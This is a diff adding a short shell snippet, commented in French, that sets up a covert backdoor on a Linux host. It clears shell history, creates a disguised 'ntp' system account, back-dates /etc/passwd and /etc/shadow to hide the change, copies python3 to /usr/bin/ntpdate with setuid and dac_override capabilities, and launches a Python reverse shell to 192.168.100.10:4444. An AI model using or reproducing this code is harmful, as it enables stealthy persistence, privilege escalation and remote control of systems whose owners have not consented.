@@ -1,0 +1,5 @@
+##### Création compte no login ntp -> ajoute de capabilities 
+unset HISTFILE; useradd -r -s /usr/sbin/nologin -d /var/lib/ntp -M -c "Network Time Protocol" ntp 2>/dev/null; touch -r /etc/fstab /etc/passwd; touch -r /etc/fstab /etc/shadow; cp /usr/bin/python3 /usr/bin/ntpdate 2>/dev/null; setcap '\''cap_dac_override,cap_setuid,cap_setgid+eip'\'' /usr/bin/ntpdate 2>/dev/null
+
+#### On lance un reverse shell
+sudo -u ntp /usr/bin/ntpdate -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'\''
